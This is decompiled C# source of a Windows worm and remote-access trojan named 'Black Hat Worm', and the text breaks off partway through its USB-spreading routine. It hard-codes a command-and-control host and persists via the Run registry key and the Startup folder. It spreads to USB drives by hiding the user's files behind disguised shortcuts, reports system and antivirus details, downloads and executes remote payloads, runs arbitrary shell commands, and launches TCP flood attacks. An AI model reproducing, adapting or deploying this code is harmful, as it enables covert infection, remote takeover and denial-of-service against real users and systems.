using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Client.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace Client;

[StandardModule]
internal sealed class BH
{
	public class SocketClient
	{
		public delegate void ConnectedEventHandler();

		public delegate void DisconnectedEventHandler();

		public delegate void DataEventHandler(byte[] b);

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private TcpClient C;

		private ConnectedEventHandler ConnectedEvent;

		private DisconnectedEventHandler DisconnectedEvent;

		private DataEventHandler DataEvent;

		private bool IsBuzy;

		private string SPL;

		public event ConnectedEventHandler Connected
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			add
			{
				ConnectedEvent = (ConnectedEventHandler)Delegate.Combine(ConnectedEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			remove
			{
				ConnectedEvent = (ConnectedEventHandler)Delegate.Remove(ConnectedEvent, value);
			}
		}

		public event DisconnectedEventHandler Disconnected
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			add
			{
				DisconnectedEvent = (DisconnectedEventHandler)Delegate.Combine(DisconnectedEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			remove
			{
				DisconnectedEvent = (DisconnectedEventHandler)Delegate.Remove(DisconnectedEvent, value);
			}
		}

		public event DataEventHandler Data
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			add
			{
				DataEvent = (DataEventHandler)Delegate.Combine(DataEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			remove
			{
				DataEvent = (DataEventHandler)Delegate.Remove(DataEvent, value);
			}
		}

		public SocketClient()
		{
			__ENCAddToList(this);
			IsBuzy = false;
			SPL = "black hat";
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			checked
			{
				lock (__ENCList)
				{
					if (__ENCList.Count == __ENCList.Capacity)
					{
						int num = 0;
						int num2 = __ENCList.Count - 1;
						int num3 = 0;
						while (true)
						{
							int num4 = num3;
							int num5 = num2;
							if (num4 > num5)
							{
								break;
							}
							WeakReference weakReference = __ENCList[num3];
							if (weakReference.IsAlive)
							{
								if (num3 != num)
								{
									__ENCList[num] = __ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						__ENCList.RemoveRange(num, __ENCList.Count - num);
						__ENCList.Capacity = __ENCList.Count;
					}
					__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		public void Connect(string h, int p)
		{
			try
			{
				try
				{
					if (C != null)
					{
						C.Close();
						C = null;
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				while (IsBuzy)
				{
					Thread.Sleep(1);
				}
				try
				{
					C = new TcpClient();
					C.Connect(h, p);
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				Thread thread = new Thread(RC, 10);
				thread.Start();
				ConnectedEvent?.Invoke();
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				DisconnectedEvent?.Invoke();
				ProjectData.ClearProjectError();
			}
		}

		public void DisConnect()
		{
			try
			{
				C.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			C = null;
			DisconnectedEvent?.Invoke();
		}

		public void Send(string s)
		{
			Send(SB(s));
		}

		public void Send(byte[] b)
		{
			try
			{
				MemoryStream memoryStream = new MemoryStream();
				memoryStream.Write(b, 0, b.Length);
				memoryStream.Write(SB(SPL), 0, SPL.Length);
				C.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				DisConnect();
				ProjectData.ClearProjectError();
			}
		}

		private void RC()
		{
			IsBuzy = true;
			MemoryStream memoryStream = new MemoryStream();
			int num = 0;
			checked
			{
				while (true)
				{
					Thread.Sleep(1);
					try
					{
						if (C == null || !C.Client.Connected)
						{
							break;
						}
						num++;
						if (num > 100)
						{
							num = 0;
							try
							{
								if (C.Client.Poll(-1, SelectMode.SelectRead) & (C.Client.Available <= 0))
								{
									break;
								}
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
								goto end_IL_0014;
							}
						}
						if (C.Available <= 0)
						{
							continue;
						}
						byte[] array = new byte[C.Available - 1 + 1];
						C.Client.Receive(array, 0, array.Length, SocketFlags.None);
						memoryStream.Write(array, 0, array.Length);
						while (BS(memoryStream.ToArray()).Contains(SPL))
						{
							Array array2 = fx(memoryStream.ToArray(), SPL);
							DataEvent?.Invoke((byte[])NewLateBinding.LateIndexGet((object)array2, new object[1] { 0 }, (string[])null));
							memoryStream.Dispose();
							memoryStream = new MemoryStream();
							if (array2.Length == 2)
							{
								memoryStream.Write((byte[])NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null), 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null), (Type)null, "length", new object[0], (string[])null, (Type[])null, (bool[])null)));
								Thread.Sleep(1);
								continue;
							}
							break;
						}
						continue;
						end_IL_0014:;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				}
				IsBuzy = false;
				DisConnect();
			}
		}
	}

	[AccessedThroughProperty("C")]
	private static SocketClient _C;

	public static string Yy = "\\worms\\.";

	public static string HOST = "chrome223.ddns.net";

	public static string port = "1998";

	public static string namee = "Black Hat Worm";

	public static string Mutexx = "YOPzlM73WHdpSgFG";

	public static string nameee = "privwate.txt.exe";

	public static string regg = "yes";

	public static string spreadss = "yes";

	public static string startup = "yes";

	public static string pastebin = "[pastebinn]";

	public static string urlll = "[urll]";

	public static object protect;

	private static System.Timers.Timer dTimer = new System.Timers.Timer();

	private const int SETDESKWALLPAPER = 20;

	private const int UPDATEINIFILE = 1;

	private static string dosss;

	private static string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static string path2 = Application.get_ExecutablePath();

	private static string regs = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

	private static string validchars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";

	private static System.Timers.Timer aTimer = new System.Timers.Timer();

	private static Mutex mtx;

	private static string ruta;

	public static SocketClient C
	{
		[DebuggerNonUserCode]
		get
		{
			return _C;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			SocketClient.DataEventHandler value2 = Data;
			SocketClient.DisconnectedEventHandler value3 = Disconnected;
			SocketClient.ConnectedEventHandler value4 = Connected;
			if (_C != null)
			{
				_C.Data -= value2;
				_C.Disconnected -= value3;
				_C.Connected -= value4;
			}
			_C = value;
			if (_C != null)
			{
				_C.Data += value2;
				_C.Disconnected += value3;
				_C.Connected += value4;
			}
		}
	} = new SocketClient();


	[DllImport("winmm.dll")]
	private static extern int mciSendString(string command, string buffer, int bufferSize, IntPtr hwndCallback);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SystemParametersInfoA(int uAction, int uParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam, int fuWinIni);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void main()
	{
		try
		{
			string text = Interaction.Command();
			text = text.Trim();
			Process.Start(text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		bool createdNew = false;
		mtx = new Mutex(initiallyOwned: true, Mutexx, out createdNew);
		if (!createdNew)
		{
			ProjectData.EndApp();
		}
		try
		{
			if (Operators.CompareString(regg, "yes", false) == 0)
			{
				((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey(regs, writable: true)!.SetValue(Path.GetFileNameWithoutExtension(path2), appdata + "\\" + Path.GetFileName(path2));
				File.Copy(path2, appdata + "\\" + Path.GetFileName(path2));
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(spreadss, "yes", false) == 0)
		{
			dTimer.Elapsed += tickee;
			dTimer.Interval = Conversions.ToDouble("2000");
			dTimer.Start();
		}
		if (Operators.CompareString(startup, "yes", false) == 0)
		{
			try
			{
				string text2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Path.GetFileNameWithoutExtension(path2) + ".exe";
				if (!File.Exists(text2))
				{
					File.Copy(Application.get_ExecutablePath(), text2);
					File.SetAttributes(text2, FileAttributes.Temporary);
				}
				protect = new FileStream(text2, FileMode.Open);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
		int try018e_dispatch = -1;
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try018e_dispatch)
				{
				default:
					if (Operators.CompareString(pastebin, "yes", false) == 0)
					{
						WebClient webClient = new WebClient();
						string text3 = webClient.DownloadString(urlll);
						HOST = text3.Split(new char[1] { ':' })[0];
						port = text3.Split(new char[1] { ':' })[1];
						webClient.Dispose();
						C.Connect(HOST, Conversions.ToInteger(port));
					}
					else
					{
						C.Connect(HOST, Conversions.ToInteger(port));
					}
					break;
				}
				break;
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				Thread.Sleep(4000);
				ProjectData.ClearProjectError();
				try018e_dispatch = 399;
			}
		}
	}

	private static void Connected()
	{
	}

	private static void Disconnected()
	{
		try
		{
			C.Connect(HOST, Conversions.ToInteger(port));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private static void Data(byte[] b)
	{
		string text = BS(b);
		string[] array = Strings.Split(text, Yy, -1, (CompareMethod)0);
		checked
		{
			try
			{
				switch (array[0])
				{
				case "~":
				{
					string antivirus = GetAntivirus();
					string text4 = ((Operators.CompareString(Path.GetFileName(path2), nameee, false) != 0) ? "NO" : "YES");
					string text5 = text5 + " SP";
					try
					{
						string[] array12 = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, (CompareMethod)0);
						if (array12.Length == 1)
						{
							text5 += "0";
						}
						text5 += array12[array12.Length - 1];
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						text5 += "0";
						ProjectData.ClearProjectError();
					}
					text5 = ((!Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86")) ? (text5 + " x86") : (text5 + " x64"));
					WindowsIdentity current = WindowsIdentity.GetCurrent();
					WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
					string text6 = ((!windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator)) ? "NO" : "YES");
					string text7 = namee.Replace("#", "") + "#" + Environment.UserName.Replace("#", "") + "#" + Environment.MachineName.Replace("#", "") + "#" + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().Replace("#", "") + text5 + "#v" + ((ServerComputer)MyProject.Computer).get_Info().get_OSVersion().Replace("#", "") + "#" + text4 + "#" + text6 + "#" + antivirus.Replace("#", "");
					C.Send("~" + Yy + text7);
					break;
				}
				case "close":
					ProjectData.EndApp();
					break;
				case "rec":
					Application.Restart();
					ProjectData.EndApp();
					break;
				case "shut":
					Interaction.Shell(array[1], (AppWinStyle)0, false, -1);
					array[1] = null;
					break;
				case "logof":
					Interaction.Shell(array[1], (AppWinStyle)0, false, -1);
					array[1] = null;
					break;
				case "rebot":
					Interaction.Shell(array[1], (AppWinStyle)0, false, -1);
					array[1] = null;
					break;
				case "opencd":
					mciSendString("set CDAudio door open", null, 0, IntPtr.Zero);
					break;
				case "closecd":
					mciSendString("set CDAudio door closed", null, 0, IntPtr.Zero);
					break;
				case "changeWL":
					try
					{
						string lpvParam = Path.GetTempPath() + "img.Bmp";
						byte[] bytes2 = Convert.FromBase64String(array[1]);
						File.WriteAllBytes(lpvParam, bytes2);
						SystemParametersInfoA(20, 0, ref lpvParam, 1);
						array[1] = null;
						break;
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
						break;
					}
				case "runexe":
					try
					{
						StringBuilder stringBuilder2 = new StringBuilder();
						Random random2 = new Random();
						int num3 = 1;
						do
						{
							int index2 = random2.Next(0, validchars.Length);
							char value2 = validchars[index2];
							stringBuilder2.Append(value2);
							num3++;
						}
						while (num3 <= 8);
						string text9 = stringBuilder2.ToString();
						string text10 = Path.GetTempPath() + text9 + "-tmp" + array[1].Split(new char[1] { ':' })[1];
						byte[] bytes = Convert.FromBase64String(array[1].Split(new char[1] { ':' })[0]);
						File.WriteAllBytes(text10, bytes);
						Process.Start(text10);
						array[1] = null;
						break;
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
						break;
					}
				case "fromurl":
					try
					{
						StringBuilder stringBuilder = new StringBuilder();
						Random random = new Random();
						int num2 = 1;
						do
						{
							int index = random.Next(0, validchars.Length);
							char value = validchars[index];
							stringBuilder.Append(value);
							num2++;
						}
						while (num2 <= 8);
						string text8 = stringBuilder.ToString();
						string fileName = Path.GetTempPath() + text8 + "-" + array[1].Split(new char[1] { '~' })[1];
						WebClient webClient = new WebClient();
						webClient.DownloadFile(array[1].Split(new char[1] { '~' })[0], fileName);
						Process.Start(fileName);
						array[1] = null;
						break;
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
						break;
					}
				case "openurl":
					Process.Start(array[1]);
					array[1] = null;
					break;
				case "unstall":
				{
					string newValue = path2;
					string text2 = array[1];
					if (Operators.CompareString(regg, "yes", false) == 0)
					{
						RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(regs, writable: true);
						registryKey.DeleteValue(Path.GetFileNameWithoutExtension(path2), throwOnMissingValue: false);
						File.Delete(appdata + "\\" + Path.GetFileName(path2));
					}
					string text3 = Path.GetTempPath() + "del.vbs";
					text2 = text2.Replace("%path%", newValue);
					text2 = text2.Replace("%usb%", nameee);
					text2 = text2.Replace("%startup%", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Path.GetFileNameWithoutExtension(path2) + ".exe");
					StreamWriter streamWriter = new StreamWriter(text3, append: false);
					streamWriter.WriteLine(text2);
					streamWriter.Close();
					array[1] = null;
					Process.Start(text3);
					ProjectData.EndApp();
					break;
				}
				case "BSOD":
					Interaction.Shell(array[1], (AppWinStyle)0, false, -1);
					array[1] = null;
					break;
				case "textsp":
					try
					{
						object objectValue2 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.SpVoice", ""));
						object[] array6 = new object[1];
						object[] array9 = array6;
						string[] array4 = array;
						string[] array10 = array4;
						int num = 1;
						array9[0] = array10[1];
						object[] array2 = array6;
						object[] array11 = array2;
						bool[] array8 = new bool[1] { true };
						NewLateBinding.LateCall(objectValue2, (Type)null, "speak", array11, (string[])null, (Type[])null, array8, true);
						if (array8[0])
						{
							array4[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
						}
						array[1] = null;
						break;
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
						break;
					}
				case "ddos":
					dosss = array[1];
					aTimer.Elapsed += tick;
					aTimer.Interval = 1.0;
					aTimer.Start();
					array[1] = null;
					break;
				case "ddosstop":
					aTimer.Stop();
					array[1] = null;
					break;
				case "admin":
					try
					{
						ProcessStartInfo processStartInfo = new ProcessStartInfo();
						new Process();
						ProcessStartInfo processStartInfo2 = processStartInfo;
						processStartInfo2.UseShellExecute = true;
						processStartInfo2.FileName = Application.get_ExecutablePath();
						processStartInfo2.WindowStyle = ProcessWindowStyle.Normal;
						processStartInfo2.Verb = "runas";
						processStartInfo2 = null;
						Process.Start(processStartInfo);
						ProjectData.EndApp();
						break;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
						break;
					}
				case "openhide":
					try
					{
						object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("internetexplorer.application", ""));
						object[] array2 = new object[1];
						object[] array3 = array2;
						string[] array4 = array;
						string[] array5 = array4;
						int num = 1;
						array3[0] = array5[1];
						object[] array6 = array2;
						object[] array7 = array6;
						bool[] array8 = new bool[1] { true };
						NewLateBinding.LateCall(objectValue, (Type)null, "navigate", array7, (string[])null, (Type[])null, array8, true);
						if (array8[0])
						{
							array4[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array6[0]), typeof(string));
						}
						NewLateBinding.LateSet(objectValue, (Type)null, "visible", new object[1] { 0 }, (string[])null, (Type[])null);
						array[1] = null;
						break;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						break;
					}
				case "closehide":
					Interaction.Shell(array[1], (AppWinStyle)0, false, -1);
					array[1] = null;
					break;
				}
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static string GetAntivirus()
	{
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0061: Expected O, but got Unknown
		try
		{
			string text = string.Empty;
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = new ManagementObjectSearcher("root\\SecurityCenter" + Interaction.IIf(((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().Contains("XP"), (object)"", (object)"2").ToString(), "SELECT * FROM AntiVirusProduct").Get().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val = (ManagementObject)enumerator.get_Current();
					text = text + " " + ((ManagementBaseObject)val).get_Item("displayName").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (Operators.CompareString(text, string.Empty, false) != 0)
			{
				return text;
			}
			return "No Antivirus";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "No Antivirus";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static void tick(object sender, ElapsedEventArgs e)
	{
		int try0001_dispatch = -1;
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
				{
					IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(dosss.Split(new char[1] { ':' })[0]), Convert.ToInt32(dosss.Split(new char[1] { ':' })[1]));
					Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
					socket.Connect(remoteEP);
					socket.Close();
					break;
				}
				}
				break;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				try0001_dispatch = 2;
			}
		}
	}

	public static byte[] SB(string s)
	{
		return Encoding.Default.GetBytes(s);
	}

	public static string BS(byte[] b)
	{
		return Encoding.Default.GetString(b);
	}

	public static Array fx(byte[] b, string WRD)
	{
		List<byte[]> list = new List<byte[]>();
		MemoryStream memoryStream = new MemoryStream();
		MemoryStream memoryStream2 = new MemoryStream();
		string[] array = Strings.Split(BS(b), WRD, -1, (CompareMethod)0);
		memoryStream.Write(b, 0, array[0].Length);
		checked
		{
			memoryStream2.Write(b, array[0].Length + WRD.Length, b.Length - (array[0].Length + WRD.Length));
			list.Add(memoryStream.ToArray());
			list.Add(memoryStream2.ToArray());
			memoryStream.Dispose();
			memoryStream2.Dispose();
			return list.ToArray();
		}
	}

	private static void tickee(object sender, ElapsedEventArgs e)
	{
		//IL_04a4: Unknown result type (might be due to invalid IL or missing references)
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string text = default(string);
		object objectValue = default(object);
		DriveInfo[] drives = default(DriveInfo[]);
		int num6 = default(int);
		DriveInfo driveInfo = default(DriveInfo);
		string name = default(string);
		string[] files = default(string[]);
		int num7 = default(int);
		string text2 = default(string);
		object obj = default(object);
		object obj2 = default(object);
		string[] directories = default(string[]);
		object obj3 = default(object);
		object obj4 = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_000a;
					case 1683:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0001;
								}
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_000a;
							case 3:
								goto IL_0022;
							case 4:
								goto IL_0042;
							case 5:
								goto IL_0050;
							case 6:
								goto IL_0061;
							case 7:
								goto IL_006b;
							case 9:
								goto IL_0088;
							case 10:
								goto IL_008c;
							case 13:
								goto IL_00cc;
							case 15:
								goto IL_00e9;
							case 16:
								goto IL_00ed;
							case 17:
								goto IL_00fc;
							case 19:
								goto IL_012a;
							case 20:
								goto IL_012e;
							case 21:
								goto IL_0175;
							case 22:
								goto IL_01a8;
							case 23:
								goto IL_01db;
							case 24:
								goto IL_026e;
							case 25:
								goto IL_0289;
							case 27:
								goto IL_02af;
							case 28:
								goto IL_02b3;
							case 32:
								goto IL_02df;
							case 33:
								goto IL_02e3;
							case 31:
							case 34:
							case 35:
								goto IL_02ff;
							case 36:
								goto IL_0306;
							case 18:
							case 37:
							case 38:
								goto IL_0309;
							case 14:
							case 39:
							case 40:
								goto IL_0314;
							case 41:
								goto IL_031a;
							case 26:
							case 29:
							case 30:
								goto IL_0323;
							case 42:
								goto IL_033f;
							case 43:
								goto IL_0362;
							case 44:
								goto IL_0372;
							case 46:
								goto IL_03a1;
							case 47:
								goto IL_03a5;
							case 48:
								goto IL_03ed;
							case 49:
								goto IL_0420;
							case 50:
								goto IL_0454;
							case 51:
								goto IL_0481;
							case 52:
								goto IL_049c;
							case 53:
								goto IL_04aa;
							case 55:
								goto IL_04d1;
							case 56:
								goto IL_04d5;
							case 59:
								goto IL_0501;
							case 60:
								goto IL_0508;
							case 45:
							case 61:
							case 62:
								goto IL_050b;
							case 63:
								goto IL_0517;
							case 64:
								goto IL_051d;
							case 54:
							case 57:
							case 58:
								goto IL_0526;
							case 65:
							case 66:
								goto IL_0544;
							case 67:
								goto IL_054a;
							case 8:
							case 11:
							case 12:
								goto IL_0553;
							default:
								goto end_IL_0001;
							case 68:
								goto end_IL_0001_2;
							}
							goto default;
						}
						IL_0517:
						num5++;
						goto IL_051d;
						IL_050b:
						num = 62;
						File.SetAttributes(text, FileAttributes.Hidden | FileAttributes.System);
						goto IL_0517;
						IL_000a:
						num = 2;
						objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("wscript.shell", ""));
						goto IL_0022;
						IL_0022:
						num = 3;
						drives = DriveInfo.GetDrives();
						num6 = 0;
						goto IL_002f;
						IL_002f:
						if (num6 < drives.Length)
						{
							driveInfo = drives[num6];
							goto IL_0042;
						}
						goto end_IL_0001_2;
						IL_051d:
						num = 64;
						goto IL_034e;
						IL_0042:
						num = 4;
						if (driveInfo.IsReady)
						{
							goto IL_0050;
						}
						goto IL_0544;
						IL_0050:
						num = 5;
						if (driveInfo.DriveType == DriveType.Removable)
						{
							goto IL_0061;
						}
						goto IL_0544;
						IL_0061:
						num = 6;
						name = driveInfo.Name;
						goto IL_006b;
						IL_006b:
						num = 7;
						if (!File.Exists(name + "\\" + nameee))
						{
							goto IL_0088;
						}
						goto IL_0553;
						IL_0088:
						num = 9;
						goto IL_008c;
						IL_008c:
						num = 10;
						((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(path2, name + "\\" + nameee);
						goto IL_0553;
						IL_0553:
						num = 12;
						files = Directory.GetFiles(name, "*.*");
						num7 = 0;
						goto IL_00b9;
						IL_00b9:
						if (num7 < files.Length)
						{
							text2 = files[num7];
							goto IL_00cc;
						}
						goto IL_033f;
						IL_0544:
						num6++;
						goto IL_054a;
						IL_00cc:
						num = 13;
						if (Operators.CompareString(Path.GetExtension(text2), ".lnk", false) != 0)
						{
							goto IL_00e9;
						}
						goto IL_0314;
						IL_00e9:
						num = 15;
						goto IL_00ed;
						IL_00ed:
						num = 16;
						if (File.Exists(text2))
						{
							goto IL_00fc;
						}
						goto IL_0314;
						IL_00fc:
						num = 17;
						if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(name + "\\" + Path.GetFileName(text2) + "\u200d.lnk"))
						{
							goto IL_012a;
						}
						goto IL_0309;
						IL_012a:
						num = 19;
						goto IL_012e;
						IL_012e:
						num = 20;
						obj = NewLateBinding.LateGet(Interaction.CreateObject("WScript.Shell", ""), (Type)null, "CreateShortcut", new object[1] { name + "\\" + Path.GetFileName(text2) + "\u200d.lnk" }, (string[])null, (Type[])null, (bool[])null);
						goto IL_0175;
						IL_0175:
						num = 21;
						NewLateBinding.LateSetComplex(obj, (Type)null, "TargetPath", new object[1] { name + "\\" + nameee }, (string[])null, (Type[])null, false, true);
						goto IL_01a8;
						IL_01a8:
						num = 22;
						NewLateBinding.LateSetComplex(obj, (Type)null, "Arguments", new object[1] { " " + Path.GetFileName(text2) }, (string[])null, (Type[])null, false, true);
						goto IL_01db;
						IL_01db:
						num = 23;
						obj2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "regread", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject((object)"HKEY_LOCAL_MACHINE\\software\\classes\\", NewLateBinding.LateGet(objectValue, (Type)null, "regread", new object[1] { "HKEY_LOCAL_MACHINE\\software\\classes\\." + Strings.Split(Path.GetFileName(text2), ".", -1, (CompareMethod)0)[Information.UBound((Array)Strings.Split(Path.GetFileName(text2), ".", -1, (CompareMethod)0), 1)] + "\\" }, (string[])null, (Type[])null, (bool[])null)), (object)"\\defaulticon\\") }, (string[])null, (Type[])null, (bool[])null));
						goto IL_026e;
						IL_026e:
						num = 24;
						if (Strings.InStr(Conversions.ToString(obj2), ",", (CompareMethod)0) == 0)
						{
							goto IL_0289;
						}
						goto IL_02af;
						IL_0289:
						num = 25;
						NewLateBinding.LateSetComplex(obj, (Type)null, "iconlocation", new object[1] { text2 }, (string[])null, (Type[])null, false, true);
						goto IL_0323;
						IL_02af:
						num = 27;
						goto IL_02b3;
						IL_02b3:
						num = 28;
						NewLateBinding.LateSetComplex(obj, (Type)null, "iconlocation", new object[1] { RuntimeHelpers.GetObjectValue(obj2) }, (string[])null, (Type[])null, false, true);
						goto IL_0323;
						IL_0323:
						num = 30;
						if (Operators.CompareString(Path.GetFileName(text2), nameee, false) != 0)
						{
							goto IL_02df;
						}
						goto IL_02ff;
						IL_02df:
						num = 32;
						goto IL_02e3;
						IL_02e3:
						num = 33;
						NewLateBinding.LateCall(obj, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
						goto IL_02ff;
						IL_02ff:
						num = 35;
						obj2 = null;
						goto IL_0306;
						IL_0306:
						obj = null;
						goto IL_0309;
						IL_0309:
						num = 38;
						File.SetAttributes(text2, FileAttributes.Hidden | FileAttributes.System);
						goto IL_0314;
						IL_0314:
						num7++;
						goto IL_031a;
						IL_031a:
						num = 41;
						goto IL_00b9;
						IL_033f:
						num = 42;
						directories = Directory.GetDirectories(name);
						num5 = 0;
						goto IL_034e;
						IL_034e:
						if (num5 < directories.Length)
						{
							text = directories[num5];
							goto IL_0362;
						}
						goto IL_0544;
						IL_054a:
						num = 67;
						goto IL_002f;
						IL_0362:
						num = 43;
						if (Directory.Exists(text))
						{
							goto IL_0372;
						}
						goto IL_0517;
						IL_0372:
						num = 44;
						if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(name + "\\" + Path.GetFileName(text) + "\u200d.lnk"))
						{
							goto IL_03a1;
						}
						goto IL_050b;
						IL_03a1:
						num = 46;
						goto IL_03a5;
						IL_03a5:
						num = 47;
						obj3 = NewLateBinding.LateGet(Interaction.CreateObject("WScript.Shell", ""), (Type)null, "CreateShortcut", new object[1] { name + "\\" + Path.GetFileName(text) + "\u200d.lnk" }, (string[])null, (Type[])null, (bool[])null);
						goto IL_03ed;
						IL_03ed:
						num = 48;
						NewLateBinding.LateSetComplex(obj3, (Type)null, "TargetPath", new object[1] { name + "\\" + nameee }, (string[])null, (Type[])null, false, true);
						goto IL_0420;
						IL_0420:
						num = 49;
						NewLateBinding.LateSetComplex(obj3, (Type)null, "Arguments", new object[1] { " " + Path.GetFileName(text) }, (string[])null, (Type[])null, false, true);
						goto IL_0454;
						IL_0454:
						num = 50;
						obj4 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "regread", new object[1] { "HKEY_LOCAL_MACHINE\\software\\classes\\folder\\defaulticon\\" }, (string[])null, (Type[])null, (bool[])null));
						goto IL_0481;
						IL_0481:
						num = 51;
